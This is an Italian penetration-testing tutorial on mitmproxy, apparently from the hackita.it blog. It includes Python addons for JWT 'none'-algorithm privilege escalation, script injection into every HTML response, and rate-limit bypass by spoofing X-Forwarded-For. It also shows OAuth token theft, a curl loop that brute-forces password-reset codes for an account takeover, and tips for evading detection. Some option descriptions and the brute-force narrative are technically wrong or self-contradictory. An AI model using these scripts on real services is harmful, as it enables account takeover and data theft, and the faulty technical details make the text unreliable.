---
title: 'Mitmproxy: Intercettazione e Manipolazione Traffico HTTP/HTTPS'
slug: mitmproxy
description: 'mitmproxy è un proxy interattivo per analisi e manipolazione del traffico HTTP/HTTPS. Ideale per testing API, debugging e security assessment autorizzato.'
image: /Gemini_Generated_Image_qw11lxqw11lxqw11.webp
draft: true
date: 2026-02-17T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - proxy
---

### Introduzione

Mitmproxy è un interactive HTTP/HTTPS proxy che permette di intercettare, ispezionare e modificare traffico web in tempo reale. A differenza di Burp Suite (GUI-focused), mitmproxy ha interfaccia console potente, scriptable in Python, e completamente open source. È il tool ideale quando hai bisogno di automazione, modifiche massive di traffic, o analisi API senza overhead di GUI pesanti.

Il

punto di forza è la **scriptability**: puoi scrivere addon Python che modificano automaticamente requests/responses al volo. Immagina di dover cambiare tutti i JSON response di un'API per testare client-side validation, o iniettare header custom in ogni request. Con mitmproxy scrivi 10 righe Python e automatizzi completamente.

Mitmproxy supporta HTTP/1, HTTP/2, WebSocket, e ha built-in certificate authority per HTTPS interception. Offre tre modalità di utilizzo: `mitmproxy` (interactive console), `mitmweb` (web UI), e `mitmdump` (command-line senza UI per automation). Quest'ultima è killer per CI/CD security testing o monitoring production traffic.

Quando usarlo: web application testing dove Burp è overkill, API reverse engineering su mobile apps, automation di security tests in pipeline, o quando devi analizzare traffico di tools che non supportano proxy configuration (usa transparent mode).

In questo articolo imparerai setup di mitmproxy per HTTPS interception, scripting avanzato per traffic manipulation, integration con testing frameworks, e techniques per bypass certificate pinning. Vedrai esempi pratici di API exploitation dove mitmproxy rivela business logic flaws invisibili a scanner automatici.

Mitmproxy si posiziona nella kill chain in **Exploitation** e **Post-Exploitation**, specificamente per web/API testing e mobile app reverse engineering.

***

## 1️⃣ Setup e Installazione

### Installation via pip

```bash
# Python 3.9+ required
pip3 install mitmproxy

# Verify installation
mitmproxy --version
# Mitmproxy: 10.1.5
```

**Latest version:** 10.1.5 (verifica su pypi.org/project/mitmproxy/)

***

### Certificate installation (HTTPS)

Per intercettare HTTPS, client deve trust il certificato CA di mitmproxy.

**Step 1: Start mitmproxy**

```bash
mitmproxy
```

**Step 2: Configure browser proxy**

```
HTTP Proxy: 127.0.0.1:8080
HTTPS Proxy: 127.0.0.1:8080
```

**Step 3: Download certificate**

```bash
# Nel browser
http://mitm.it
# Download certificate per tuo OS/browser
```

**Linux/Firefox:**

```bash
# Import cert
certutil -d sql:$HOME/.mozilla/firefox/*.default -A -t "C,," -n mitmproxy -i ~/.mitmproxy/mitmproxy-ca-cert.pem
```

**macOS:**

```bash
# System Keychain
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.mitmproxy/mitmproxy-ca-cert.pem
```

**Android (rooted):**

```bash
# Push cert to device
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/
# Settings → Security → Install from storage
```

***

## 2️⃣ Uso Base

### Interactive mode (mitmproxy)

```bash
mitmproxy
```

**Interface:**

```
[Intercept: ON] [Filter: ~s] [Queue: 12 flows]

GET https://api.example.com/v1/users
← 200 OK application/json 2.5kB

POST https://api.example.com/v1/login  
← 401 Unauthorized application/json 156B

GET https://cdn.example.com/static/app.js
← 200 OK application/javascript 45kB
```

**Keyboard shortcuts:**

* `Enter` → View flow details
* `e` → Edit request/response
* `r` → Replay request
* `f` → Set filter expression
* `q` → Quit

***

### Web UI mode (mitmweb)

```bash
mitmweb
# [*] Web server listening at http://127.0.0.1:8081/
```

**Access:** [http://127.0.0.1:8081](http://127.0.0.1:8081)

**Features:**

* Visual flow inspection
* Search/filter via web interface
* Export flows to HAR format
* Good per beginners

***

### Command-line mode (mitmdump)

```bash
# Dump tutto il traffico
mitmdump

# Save to file
mitmdump -w capture.mitm

# Replay da file
mitmdump -r capture.mitm
```

**Output:**

```
192.168.1.100:54321 → 93.184.216.34:443 (example.com)
GET /api/v1/data
← 200 OK 1.2kB

192.168.1.100:54322 → 93.184.216.34:443
POST /api/v1/submit
{"user": "alice", "action": "delete"}
← 403 Forbidden
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: API parameter tampering

**Contesto:** Testing mobile app che chiama API REST.

**Setup proxy su Android:**

```bash
# WiFi settings → Proxy manual
# Host: <IP-tuo-laptop>
# Port: 8080

# Mitmproxy sul laptop
mitmproxy -p 8080 --mode regular
```

**App fa request:**

```
POST https://api.mobileapp.com/purchase
Content-Type: application/json

{
  "item_id": 12345,
  "quantity": 1,
  "price": 99.99,
  "user_id": "alice"
}
```

**Intercept in mitmproxy:**

* Premi `Enter` su flow
* Premi `e` → Edit request
* Cambia `"price": 99.99` → `"price": 0.01`
* Premi `q` per save
* Request modificata viene inviata

**Response:**

```
200 OK
{
  "status": "success",
  "order_id": 789,
  "total_paid": 0.01
}
```

🎓 **Business logic flaw:** Server non valida price lato server, trust client input.

**Timeline:** 2 minuti da intercept a exploitation

***

### Scenario 2: Session hijacking via cookie manipulation

**Request originale:**

```
GET https://webapp.example.com/admin
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo1fQ.hash
```

**Decode JWT:**

```bash
# eyJ1c2VyX2lkIjo1fQ decoded:
# {"user_id": 5}
```

**Intercept e modifica:**

* Edit request
* Cambia `user_id: 5` → `user_id: 1` (admin?)
* Re-encode JWT
* Send

**Se server non verifica signature JWT:**

```
200 OK
Welcome, Admin!
```

**Exploitation via scripting:**

```python
# addon.py
from mitmproxy import http
import jwt

def request(flow: http.HTTPFlow) -> None:
    if "session=" in flow.request.headers.get("cookie", ""):
        token = extract_token(flow.request.headers["cookie"])
        # Decode JWT (without verification)
        payload = jwt.decode(token, options={"verify_signature": False})
        
        # Modify user_id
        payload["user_id"] = 1
        
        # Re-encode (server doesn't verify!)
        new_token = jwt.encode(payload, key="", algorithm="none")
        flow.request.headers["cookie"] = f"session={new_token}"
```

```bash
mitmproxy -s addon.py
# Automatic JWT tampering su ogni request
```

Per approfondire JWT security e exploitation techniques, consulta [vulnerabilità comuni in JSON Web Token implementation](https://hackita.it/articoli/jwt).

***

### Scenario 3: Certificate pinning bypass (Android)

**Problema:** App Android ha certificate pinning, rifiuta mitmproxy cert.

**Error:**

```
javax.net.ssl.SSLHandshakeException: 
  java.security.cert.CertPathValidatorException: 
  Trust anchor for certification path not found.
```

**Bypass con Frida:**

```bash
# Install Frida
pip install frida-tools

# Download universal SSL pinning bypass script
wget https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/

# Run Frida
frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause
```

**Mitmproxy ora vede tutto il traffico HTTPS dell'app.**

**Timeline:** 5 minuti setup Frida + bypass

***

## 4️⃣ Tecniche Avanzate

### Scripting automatico - Response injection

**Use case:** Inject JavaScript in ogni HTML response per [XSS](https://hackita.it/articoli/xss) testing.

```python
# inject_xss.py
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "text/html" in flow.response.headers.get("content-type", ""):
        payload = '<script>alert("XSS via mitmproxy")</script>'
        flow.response.content = flow.response.content.replace(
            b'</body>',
            f'{payload}</body>'.encode()
        )
```

```bash
mitmproxy -s inject_xss.py
# Browse any website → XSS payload injected
```

***

### Transparent proxy mode

**Quando:** App non supporta proxy configuration (hardcoded connections).

**Setup iptables redirect:**

```bash
# Redirect port 80/443 traffic a mitmproxy
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Mitmproxy in transparent mode
mitmproxy --mode transparent --showhost
```

**Target device:** Configure gateway to attacker IP. Tutto il traffico HTTP/HTTPS passa per mitmproxy senza proxy configuration.

***

### Upstream proxy chaining

**Scenario:** Corporate environment con mandatory HTTP proxy.

```bash
# Mitmproxy → Corporate Proxy → Internet
mitmproxy --mode upstream:http://corporate-proxy.company.com:8080
```

**Use case:** Testing in enterprise networks dove direct internet access è bloccato.

***

### Websocket interception

```bash
mitmproxy
# Filter per websocket flows
# Press 'f' → Enter: ~websocket
```

**Intercept WebSocket message:**

```
WebSocket connection to wss://realtime.example.com/chat

→ {"type": "message", "text": "Hello", "user": "alice"}
← {"status": "delivered", "timestamp": 1234567890}
```

**Edit message in real-time:**

* Press `e` on flow
* Modify JSON
* Message modificato inviato a server

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: [API](https://hackita.it/articoli/api) rate limiting bypass

**Contesto:** API ha rate limit 100 req/min per IP. Need testare con più requests.

```python
# rotate_ip.py
from mitmproxy import http
import random

def request(flow: http.HTTPFlow) -> None:
    # Spoof X-Forwarded-For header
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    flow.request.headers["X-Forwarded-For"] = fake_ip
```

```bash
mitmproxy -s rotate_ip.py

# Ogni request ha X-Forwarded-For diverso
# Se server trust questo header, bypass rate limit
```

**OUTPUT:**

```
Request 1: X-Forwarded-For: 192.45.123.78 → 200 OK
Request 2: X-Forwarded-For: 10.234.56.199 → 200 OK
[... 200+ requests senza rate limit error]
```

**COSA FARE SE FALLISCE:**

1. **Server ignora X-Forwarded-For:** Prova `X-Real-IP`, `CF-Connecting-IP`, altri header
2. **Rate limit ancora triggerato:** Server usa IP reale, non header. Serve multiple source IP (VPN/proxies)
3. **Requests blocked:** WAF detecta pattern. Add random delay tra requests

**Timeline:** 3 minuti scripting + testing

***

### Scenario B: GraphQL introspection e query manipulation

**Contesto:** Mobile app usa GraphQL API. Need discover schema.

**Intercept query:**

```
POST https://api.app.com/graphql
Content-Type: application/json

{"query": "{ user(id: 5) { name email } }"}
```

**Inject introspection query:**

```python
# graphql_introspect.py
from mitmproxy import http
import json

def request(flow: http.HTTPFlow) -> None:
    if "/graphql" in flow.request.path:
        introspection_query = """
        {
          __schema {
            types {
              name
              fields {
                name
                type { name }
              }
            }
          }
        }
        """
        flow.request.content = json.dumps({"query": introspection_query}).encode()
```

```bash
mitmproxy -s graphql_introspect.py
# First GraphQL request → Schema dump
```

**Response reveals:**

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {"name": "id", "type": {"name": "Int"}},
            {"name": "email", "type": {"name": "String"}},
            {"name": "creditCard", "type": {"name": "String"}},
            {"name": "isAdmin", "type": {"name": "Boolean"}}
          ]
        }
      ]
    }
  }
}
```

🎓 **Discovery:** Schema has `creditCard` and `isAdmin` fields non visibili in app UI.

**Exploitation:**

```json
{"query": "{ user(id: 5) { name email creditCard isAdmin } }"}
```

**Response:**

```json
{
  "data": {
    "user": {
      "name": "Alice",
      "email": "alice@example.com",
      "creditCard": "4532-****-****-1234",
      "isAdmin": false
    }
  }
}
```

**Timeline:** 5 minuti da introspection a data exfiltration

***

### Scenario C: OAuth token theft

**Flow normale OAuth:**

```
1. App → https://oauth.provider.com/authorize?client_id=...
2. User login
3. Provider → App redirect: https://app.com/callback?code=AUTH_CODE
4. App → Provider: Exchange code for token
5. Provider → App: {"access_token": "eyJhbGc...", "refresh_token": "..."}
```

**Intercept step 5 in mitmproxy:**

```
POST https://oauth.provider.com/token
← 200 OK
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "def50200a1b2c3d4...",
  "expires_in": 3600
}
```

**Export token:**

```bash
# In mitmproxy
# Press 'e' on response → Copy access_token

# Test token
curl -H "Authorization: Bearer eyJhbG..." https://api.app.com/user/me
# 200 OK
# {"user_id": 123, "username": "victim"}
```

**Use stolen token per API calls arbitrari.**

**Timeline:** 1 minuto da intercept a token theft

***

## 6️⃣ Toolchain Integration

### Mitmproxy → [Burp Suite](https://hackita.it/articoli/burp-suite) collaboration

**Workflow:**

1. **Mitmproxy** per traffic capture e basic analysis
2. **Export flows** in HAR format
3. **Import in Burp** per advanced testing (Scanner, Intruder)

```bash
# In mitmweb
# File → Export → HAR

# Burp Suite
# Proxy → HTTP History → Import → HAR file
```

***

### Mitmproxy + Selenium automation

```python
# automated_test.py
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Configure Chrome to use mitmproxy
chrome_options = Options()
chrome_options.add_argument('--proxy-server=127.0.0.1:8080')
chrome_options.add_argument('--ignore-certificate-errors')

driver = webdriver.Chrome(options=chrome_options)
driver.get('https://webapp.example.com')

# Login automation
driver.find_element_by_id('username').send_keys('test')
driver.find_element_by_id('password').send_keys('test123')
driver.find_element_by_id('login-btn').click()

# Mitmproxy cattura tutto il traffico
# Analyze captured flows
```

***

### Mitmproxy vs Burp Suite vs [OWASP ZAP](https://hackita.it/articoli/zap)

| **Feature**     | **Mitmproxy**   | **Burp Suite**  | **OWASP ZAP**  |
| --------------- | --------------- | --------------- | -------------- |
| **Interface**   | CLI/Web         | GUI             | GUI            |
| **Scripting**   | Python (native) | Java/Extensions | Python/Scripts |
| **Scanner**     | ❌ No            | ✅ Yes (Pro)     | ✅ Yes (Free)   |
| **Performance** | ⚡ Fast          | 🟡 Medium       | 🟡 Medium      |
| **Automation**  | ✅ Best          | ⚠️ Limited      | ⚠️ Limited     |
| **Price**       | Free            | $449/year       | Free           |

**Usa Mitmproxy quando:**

* Need automation/scripting
* CLI workflow preferred
* CI/CD integration
* Performance critical

**Usa Burp quando:**

* Need automated scanner
* GUI workflow preferred
* Enterprise features (Collaborator, extensions ecosystem)

***

## 7️⃣ Attack Chain Completa

### Mobile App → API Exploitation → Account Takeover

**Obiettivo:** Da mobile app testing a account takeover.

***

**FASE 1: Setup interception**

```bash
# Mitmproxy
mitmproxy -p 8080

# Android proxy config
# WiFi → Manual Proxy → 192.168.1.100:8080

# Install mitmproxy cert
http://mitm.it → Android cert
```

**Timeline:** 3 minuti

***

**FASE 2: Traffic analysis**

**Intercept login request:**

```
POST https://api.mobileapp.com/auth/login
{"username": "testuser", "password": "Test123!"}

← 200 OK
{"token": "eyJhbGciOi...", "user_id": 1234}
```

**Timeline:** 1 minuto

***

**FASE 3: Password reset flow analysis**

**App flow:**

```
POST /auth/reset-password
{"email": "victim@example.com"}

← 200 OK
{"message": "Reset code sent"}

POST /auth/verify-reset
{"email": "victim@example.com", "code": "123456"}

← 200 OK
{"reset_token": "temp_abc123"}

POST /auth/new-password
{"reset_token": "temp_abc123", "password": "NewPass123!"}

← 200 OK
{"message": "Password updated"}
```

**Timeline:** 5 minuti testing flow

***

**FASE 4: Vulnerability discovery**

**Hypothesis:** Reset code è sequenziale/predictable?

**Test con scripting:**

```python
# brute_reset.py
from mitmproxy import http

counter = 100000

def request(flow: http.HTTPFlow) -> None:
    global counter
    if "/auth/verify-reset" in flow.request.path:
        flow.request.content = f'{{"email": "victim@example.com", "code": "{counter}"}}'.encode()
        counter += 1
```

```bash
mitmproxy -s brute_reset.py
# Trigger verify-reset request multiple times
# [app automation or manual]
```

**Finding:** Code 123456 accepted dopo \~50 attempts = 6-digit numeric code senza rate limiting.

**Timeline:** 10 minuti

***

**FASE 5: Exploitation**

```bash
# Automated brute-force
for code in {100000..999999}; do
    curl -X POST https://api.mobileapp.com/auth/verify-reset \
      -H "Content-Type: application/json" \
      -d "{\"email\": \"victim@example.com\", \"code\": \"$code\"}" \
      | grep "reset_token" && echo "CODE FOUND: $code" && break
done

# Output:
# CODE FOUND: 234567
# {"reset_token": "temp_xyz789"}
```

**Set new password:**

```bash
curl -X POST https://api.mobileapp.com/auth/new-password \
  -H "Content-Type: application/json" \
  -d '{"reset_token": "temp_xyz789", "password": "Hacked123!"}'

# {"message": "Password updated"}
```

**Login con nuovo password:**

```bash
curl -X POST https://api.mobileapp.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "victim@example.com", "password": "Hacked123!"}'

# {"token": "eyJhbGc...", "user_id": 5678}
# Account takeover completo
```

**Timeline:** 15 minuti brute-force

***

**TOTALE:** \~34 minuti da setup mitmproxy a account takeover

**Mitmproxy role:** Traffic interception rivelò password reset flow, mancanza rate limiting, e structure di API calls necessary per exploitation.

***

## 8️⃣ Detection & Evasion

### Cosa monitora Blue Team

**Network-level:**

```
- Proxy traffic patterns (all traffic a single IP:8080)
- Certificate Authority changes (client trust new CA)
- SNI/TLS handshake anomalies
```

**Application-level:**

```
- Unusual User-Agent strings
- Missing/modified headers
- Request timing patterns (automation detection)
- Certificate pinning violations (mobile apps)
```

***

### Evasion techniques

**1. Custom certificate per domain**

```bash
# Generate cert che matcha legitimate issuer
mitmproxy --set confdir=~/.mitmproxy-custom
# Modify cert details in ~/.mitmproxy-custom/mitmproxy-ca.pem
```

**2. Header normalization**

```python
# normalize_headers.py
def request(flow: http.HTTPFlow) -> None:
    # Add realistic headers
    flow.request.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
    flow.request.headers["Accept-Language"] = "en-US,en;q=0.9"
    flow.request.headers["Accept-Encoding"] = "gzip, deflate, br"
```

**3. Timing randomization**

```python
# random_delay.py
import random
import time

def request(flow: http.HTTPFlow) -> None:
    time.sleep(random.uniform(0.5, 3.0))  # Random 0.5-3s delay
```

***

### Cleanup

```bash
# Stop mitmproxy
# Ctrl+C

# Remove certificate da browser
# Firefox: Settings → Certificates → Remove mitmproxy CA

# Disable proxy
# Browser settings → No proxy

# System-level:
unset HTTP_PROXY HTTPS_PROXY
```

***

## 9️⃣ Performance & Scaling

### Single session performance

**Benchmark (laptop i5, 8GB RAM):**

| **Traffic Volume**      | **CPU Usage** | **Memory** | **Latency Added** |
| ----------------------- | ------------- | ---------- | ----------------- |
| Light (10 req/min)      | 5%            | 100MB      | +10ms             |
| Medium (100 req/min)    | 15%           | 250MB      | +25ms             |
| Heavy (500 req/min)     | 40%           | 600MB      | +50ms             |
| Extreme (1000+ req/min) | 80%           | 1.2GB      | +150ms            |

***

### Optimization tips

```bash
# Disable web interface (save resources)
mitmproxy --no-web

# Increase flow size limit
mitmproxy --set flow_detail=0

# Disable SSL logs
mitmproxy --set ssl_insecure=true
```

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Comando**                    | **Funzione**        | **Use Case**           |
| ------------------------------ | ------------------- | ---------------------- |
| `mitmproxy`                    | Interactive console | Manual testing         |
| `mitmweb`                      | Web UI              | Beginner-friendly      |
| `mitmdump`                     | CLI dump            | Automation/logging     |
| `mitmproxy -s script.py`       | Run addon           | Traffic manipulation   |
| `mitmproxy -p 9090`            | Custom port         | Avoid conflicts        |
| `mitmproxy --mode transparent` | Transparent proxy   | No proxy config needed |
| `mitmproxy -r capture.mitm`    | Replay capture      | Offline analysis       |

***

### Scripting Hooks

| **Hook**              | **Trigger**             | **Use Case**                   |
| --------------------- | ----------------------- | ------------------------------ |
| `request()`           | Before request sent     | Modify outgoing traffic        |
| `response()`          | After response received | Inject payloads in responses   |
| `requestheaders()`    | Headers received        | Filter/modify headers only     |
| `responseheaders()`   | Response headers        | Same, for responses            |
| `websocket_message()` | WebSocket traffic       | Real-time message interception |

***

## 11️⃣ Troubleshooting

### SSL/TLS errors

**Error:**

```
Client connection killed by block_global
```

**Causa:** Certificate not trusted by client.

**Fix:**

```bash
# Re-install certificate
# Browser → http://mitm.it → Download

# Verify cert installed
# Firefox: Settings → Certificates → Authorities → mitmproxy

# Or bypass SSL verification (testing only)
curl -k https://example.com
```

***

### Mobile app non vede traffico

**Causa:** App usa certificate pinning.

**Fix:**

```bash
# Method 1: Frida SSL pinning bypass (vedi Scenario 3)

# Method 2: Patch APK
apktool d app.apk
# Remove pinning in network_security_config.xml
apktool b app -o app_patched.apk
```

***

### Performance degradation

**Causa:** Large responses/requests causing memory bloat.

**Fix:**

```bash
# Limit flow size
mitmproxy --set stream_large_bodies=5m

# Disable streaming for specific domains
# In addon:
def responseheaders(flow):
    if "cdn.example.com" in flow.request.host:
        flow.response.stream = True
```

***

## 12️⃣ FAQ

**Q: Mitmproxy può intercettare non-HTTP traffic (TCP)?**

A: **Sì, parzialmente**. Supporta TCP proxy mode ma senza parsing/modification:

```bash
mitmproxy --mode regular --tcp-hosts '.*'
```

Vedi raw bytes, ma no high-level manipulation come HTTP.

**Q: Funziona con HTTP/3 (QUIC)?**

A: **No**. Mitmproxy supporta solo HTTP/1.1, HTTP/2, WebSocket. HTTP/3 over QUIC non è supportato (2026).

**Q: Posso usare mitmproxy in production monitoring?**

A: **Tecnicamente sì, ma sconsigliato**. Designed per testing, non production. Alternative: nginx with logging, dedicated APM tools.

**Q: Mitmproxy funziona su mobile senza root?**

A: **Sì per HTTP**. Per HTTPS serve installare cert, che richiede:

* Android 7+: User certificate OK (no root)
* Android 10+: App deve allow user certificates in manifest (o root per system cert)

**Q: Scripting richiede Python expertise?**

A: **Basic Python sufficiente**. Most common tasks sono semplici string/dict manipulation. Esempi in docs sono copy-paste ready.

**Q: Detection rate da WAF/IDS?**

A: **Basso se configurato bene**. Mitmproxy stesso non è detectabile (è legit proxy). Detection avviene su:

* Anomalie header (fix con scripting)
* Timing patterns (randomize)
* Certificate changes (mobile pinning bypass è detectabile)

**Q: Può sostituire Burp Suite?**

A: **Dipende**. Per automated testing e scripting, sì. Per manual web testing con scanner, no (Burp ha features tipo Scanner, Collaborator che mitmproxy non ha).

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**           | **Command**                                   |
| ---------------------- | --------------------------------------------- |
| **Basic interception** | `mitmproxy`                                   |
| **Web UI**             | `mitmweb`                                     |
| **Automation/logging** | `mitmdump -w capture.mitm`                    |
| **Custom script**      | `mitmproxy -s addon.py`                       |
| **Transparent mode**   | `mitmproxy --mode transparent`                |
| **Upstream proxy**     | `mitmproxy --mode upstream:http://proxy:8080` |
| **Custom port**        | `mitmproxy -p 9090`                           |
| **Replay capture**     | `mitmproxy -r capture.mitm`                   |
| **Filter HTTPS only**  | `mitmproxy` → Press `f` → Enter `~s`          |

***

## Perché è rilevante oggi (2026)

API-first architectures e mobile apps dominano. Traditional web scanners spesso falliscono su API complesse (GraphQL, WebSocket, custom protocols). Mitmproxy eccelle qui: scriptable Python, HTTP/2 support, WebSocket interception. Modern authentication (OAuth, JWT) richiede fine-grained request manipulation che GUI tools rendono tedious. Mitmproxy in pipeline CI/CD permette security regression testing automatico. Certificate pinning è ancora bypassable con Frida, rendendo mobile app testing feasible.

***

## Differenza rispetto ad alternative

| **Tool**          | **Quando usarlo**                     | **Limiti Mitmproxy**                        |
| ----------------- | ------------------------------------- | ------------------------------------------- |
| **Burp Suite**    | Manual testing, need Scanner/Intruder | Mitmproxy ha no scanner, no fuzzer built-in |
| **OWASP ZAP**     | Free full-featured alternative        | Mitmproxy ha no automated scanner           |
| **Charles Proxy** | macOS/iOS ecosystem, GUI preference   | Mitmproxy è CLI-focused, no native macOS UI |

**Usa Mitmproxy per:** Automation, scripting, CI/CD, performance-critical, API testing.

***

## Hardening / Mitigazione

**Difendersi da proxy interception:**

1. **Certificate pinning:** Pin leaf cert o public key. Bypasses existono (Frida) ma richiedono root/jailbreak
2. **Anti-tampering:** Detect root/jailbreak, refuse execution
3. **Mutual TLS:** Client authentication via certificate, non solo server
4. **End-to-end encryption:** Encrypt payload dentro già-encrypted HTTPS (defense in depth)
5. **Integrity checks:** HMAC/signature su request bodies
6. **Behavioral detection:** Server-side anomaly detection (unusual patterns, modified headers)

***

## OPSEC e Detection

**Rumorosità:** Bassa (proxy è legit traffic). Detection avviene su:

**Certificate changes:**

* Client trusts new CA (IT può monitor certificate store changes)
* SNI mismatch possible in some configs

**Application-level:**

* Modified/missing headers (fix con scripting)
* Timing anomalies (automation detection)
* Certificate pinning violations (app crashes/refuses connection = visible)

**Riduzione detection:**

* Use realistic headers (User-Agent, Accept-\*, etc.)
* Randomize timing
* For mobile: Patch app instead of Frida (less suspicious)

**Nessun Event ID specifico** (è network-level, non OS-level). Detection avviene tramite:

* Network monitoring (proxy traffic patterns)
* Application logs (connection errors from pinning)
* Endpoint protection (root/jailbreak detection on mobile)

***

## Disclaimer

Mitmproxy è tool per **security testing, development, debugging**. Intercettare traffico altrui senza autorizzazione è illegale (wiretapping laws, CFAA). Certificate installation su dispositivi non tuoi richiede consenso. Usa solo in:

* Dispositivi di tua proprietà
* Pentest con contratto scritto
* Development/testing environments autorizzati

**Repository:** [https://github.com/mitmproxy/mitmproxy](https://github.com/mitmproxy/mitmproxy)
**Documentation:** [https://docs.mitmproxy.org/](https://docs.mitmproxy.org/)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
